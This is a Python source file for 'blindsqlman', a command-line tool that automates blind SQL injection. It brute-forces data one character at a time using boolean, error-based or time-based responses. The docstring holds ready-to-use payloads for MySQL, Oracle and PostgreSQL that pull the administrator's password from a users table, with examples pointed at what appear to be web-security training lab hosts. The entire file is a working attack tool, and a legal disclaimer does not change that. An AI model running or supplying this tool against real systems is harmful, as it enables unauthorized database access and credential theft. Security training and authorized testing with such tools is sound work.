#!/usr/bin/python3
"""
Copyright (c) 2022-2022 blindsqlman developers
See the file 'LICENSE' for copying permission
"""
import requests
import time
import string, random
import sys
import argparse
from http.cookies import SimpleCookie
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
'''
Specify ^PAYLOAD^ in url/cookie//// , this script will replace it with payload

Blind SQL Injection Based on Error
python3 blindSQLman.py -u [URL] [-c [COOKIE]] -D [DIFF] 
Blind SQL Injection Based on Time
python3 blindSQLman.py -u [URL] [-c [COOKIE]] --tech T -D [DIFF] [--timeout 5]

EXAMPLE:
    # Bool Based Mysql Injection
    python3 blindSQLman.py -u https://ac7d1fba1e422a3ac0ad8e3800f20085.web-security-academy.net/filter?category=Gifts -c "TrackingId=Clv6J8Q4AjAffZhD^PAYLOAD^; session=dGVP3Aje0wspCVHJzYpBV0YluhL4o623" -p "' and (select password from users where username='administrator') like '{0}{1}%25'---" -D "Welcome back!"
    
    # Error Based Oracle Injection
    python3 .\blindSQLMan.py -u https://aca51f091e962697c03c01fb00d100b8.web-security-academy.net/filter?category=Gifts -c "TrackingId=AAA^PAYLOAD^; session=9N5D5dTIq3sXCxi2wxFDlxEn4aJXsJ1q" -p "'||(select case when substr(password,1,{2})='{0}{1}' then to_char(1/0) else '' end from users where username='administrator')||'" --dbms oracle --tech E -S 500
    
    # Time Based PostgreSQL Injection
    python3 .\blindSQLMan.py -u https://aca31faf1e531492c019776b00b800f4.web-security-academy.net/filter?category=Pets -c "TrackingId=XXX^PAYLOAD^; session=zAnAGew3uGY3zjirOPFuM6tKnKGQ74eg" -p "'%3BSELECT CASE WHEN (select SUBSTRING(password,1,{2})='{0}{1}' FROM users WHERE username='administrator') THEN pg_sleep(5) ELSE pg_sleep(0) END---" --tech=T --dbms=PostgreSQL
'''
BANNER = '''Y#~!^                                      .~.    
7@@JG~            ..   :^~?Y?7.            .!5    
 !@&~G!            : ~&@@@@@@P            ..:5.   
  !@&~P~           ^:#@@@@@@&5~.           ::!^   
   ~@#:Y!           :G@@@@@&G5?~~^          ::7   
    !@B^G~          .P@@BY!    :~:          . ::  
    B@@P:57:^:       !P!  ::.?B#^          ~:.7.  
 !G&@&&&P?7..~~      7~~#Y#@@@&!        :!:^&@@:  
.@@@&P&#B5Y!:.J7     .J!@&#GB@B.        ^G? J@@#. 
 Y@@&#@#PJ7!7~~#:     5PG7~  :5P7            ~BG. 
  5@@@&^   7YB::Y     .?  .~  .JG:                
   :YP#~  .55?. G.     G:  ~J?^~Y^                
      .JY      .#^     JP   .^Y5^                 
        !5^     :^     .B:    !!:            .:~7Y
       .P@#J.!^         ^~  .7PB~          !GBPP5Y
       ^@@&J!P#~         :.~?~5:       :^~B&BJJ?P&
        !@B5YP#&7.       ^J:.        .7~Y##G?Y5&@@
        ~@@@@@@@&J^:  .!~~.         ~5?Y##YJP#&P&@
        5@@@&5GYP&PJ7.^:      ~    G7?G#G75&&P^?&&
        P@@GYPB#&&J^PP.       ~   :5 ?GP~J@#~ :G&&
        ?@@P?YYJPP  ~&&PGBBGBPJ: ^5J!:Y^!#Y  !#B5:
        .@@7~GJYJ^ ~#@@@@@@@@@@@&&#BB!!^!:  JBJ. ^
         B@&&Y77~:J@@@  ZATOICHI  @@&?JY.  .77Y7YP
'''
LEGAL_DISCLAIMER = "Usage of blindsqlman for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program"

charset = string.hexdigits
charset = string.digits + string.ascii_lowercase 
# charset+= string.ascii_uppercase
prompt = ""
______ = ""
pos    = 1
found  = False

def resp(args):
    m = {
        'GET': requests.get,
        'POST': requests.post,
        'PUT': requests.put
    }
    stt = time.time()
    r = m[args.method](args.url, headers=args.headers, cookies=args.cookies, verify=False)
    if args.tech == 'B':
        if args.diff in r.text:
            return True
    if args.tech == 'E':
        if args.status_code == r.status_code:
            return True
    if args.tech == 'T':
        cst = time.time() - stt
        if cst > args.timeout:
            return True
    return False

def attack(i, args):
    global prompt
    global pos
    
    args.i = i
    if args.dbms == 'Mysql':
        payload = args.payload.format(prompt, i)
    if args.dbms in ['Oracle', 'PostgreSQL']:
        payload = args.payload.format(prompt, i, pos)
    args.url = args.url.replace('^PAYLOAD^', payload)
    args.data= args.data.replace('^PAYLOAD^', payload)
    # args.header = "Pragma: no-cache"
    args.headers = {}
    for h in args.header:
        h = h.replace('^PAYLOAD^', payload)
        k, v = h.split(': ')
        args.headers[k] = v
    # args.cookie = "TrackingId=2YKPMTBVsfeS0OS7^PAYLOAD^; session=49zx6cvy1yLgdzQjHAx5Ynqxd60ErWlb"
    cookie = SimpleCookie()
    cookie.load(args.cookie)
    args.cookies = {}
    for key, morsel in cookie.items():
        args.cookies[key] = morsel.value.replace('^PAYLOAD^', payload)
    # print(args.cookies)
    try:
        if resp(args):
            return True
    except KeyboardInterrupt:
        sys.exit()
    except requests.exceptions:
        sys.exit()
    
def parser():
    parser = argparse.ArgumentParser(prog='Blind SQLMan', conflict_handler='resolve')
    parser.add_argument('-u', '--url', type=str, help='TARGET URL')
    parser.add_argument('--dbms', type=str, default='Mysql', help='TARGET DBMS')
    parser.add_argument('-m', '--method', type=str, default='GET', help='REQUEST METHOD')
    parser.add_argument('-d', '--data', type=str, default='', help='DATA')
    parser.add_argument('-H', '--header', action='append', default=[], help='HEADER')
    parser.add_argument('-c', '--cookie', type=str, help='COOKIE')
    parser.add_argument('--tech', type=str, default='B', help='TECHNIQUE: B|E|T')
    parser.add_argument('-p', '--payload', type=str, help='PAYLOAD')
    parser.add_argument('-D', '--diff', type=str, help='DIFFERENT RESPONSE TEXT')
    parser.add_argument('-S', '--status_code', type=int, default=200, help='STATUS CODE')
    parser.add_argument('--timeout', default=5, type=int, help='TIMEOUT OF TIME BASED')
    #parser.add_argument('--threads', default=10, type=int, help='THREADS')
    parser.add_argument('-h', '--help', action='store_true', help='PRINT THIS')
    return parser

print(BANNER)
print(LEGAL_DISCLAIMER + '\n')
parser = parser()
args = parser.parse_args()
if args.help:
    parser.print_help()
    exit()
if not args.url or not args.payload:
    print("Require URL/PAYLOAD")
    exit()

from reprint import output
with output(initial_len=2, interval=0) as output_lines:
    while True:
        found = True
        for i in charset:
            output_lines[0] = '[INFO] CURRENT TESTING ---> ' + i
            if attack(i, args):
                prompt += i
                ______ += '_'
                found = False
                pos += 1
                break
        output_lines[1] = '[INFO] RESULT IS ' + prompt
        if found:
            break